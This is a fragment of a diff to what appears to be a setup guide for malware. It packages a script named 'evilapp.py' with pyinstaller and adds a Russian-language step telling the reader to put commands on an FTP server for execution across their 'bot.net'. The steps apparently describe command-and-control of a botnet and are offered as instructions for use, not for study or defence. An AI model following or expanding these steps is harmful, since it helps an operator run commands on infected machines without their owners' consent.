@@ -18,3 +18,5 @@ pip3 install pyinstaller
 ```bash
 pyinstaller --onefile evilapp.py
 ```
+### Шаг 6
+зайти на сервер по FTP открыть файл который создали на сервере и вписать команды которые вы хотели бы чтобы исполнялись на вашем bot.net.
